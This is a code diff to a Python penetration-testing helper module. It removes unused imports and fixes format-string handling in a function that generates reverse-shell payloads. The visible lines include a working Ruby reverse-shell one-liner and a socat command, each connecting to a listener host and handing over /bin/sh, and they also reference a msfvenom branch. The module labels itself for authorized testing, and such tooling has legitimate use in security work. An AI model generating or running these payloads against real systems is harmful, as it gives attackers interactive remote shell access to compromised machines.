@@ -5,12 +5,7 @@ obfuscation helpers and credential wordlists for authorized engagements.
 """
 
 import base64
-import binascii
-import datetime
-import os
 import re
-import shlex
-import textwrap
 
 _SHELL_WARNING = (
     "# Authorized security testing only - the target must be in your "
@@ -77,8 +72,8 @@ def tool_gen_reverse_shell(os_type="linux", lhost="127.0.0.1", lport=4444,
         elif method == "ruby":
             payload = (
                 "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;"
-                "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
-                % (lhost, lport, lport, lport))
+                "exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'"
+                % (lhost, lport))
         elif method == "socat":
             payload = ("socat TCP:%s:%d EXEC:/bin/sh,pipes" % (lhost, lport))
         elif method == "msfvenom":
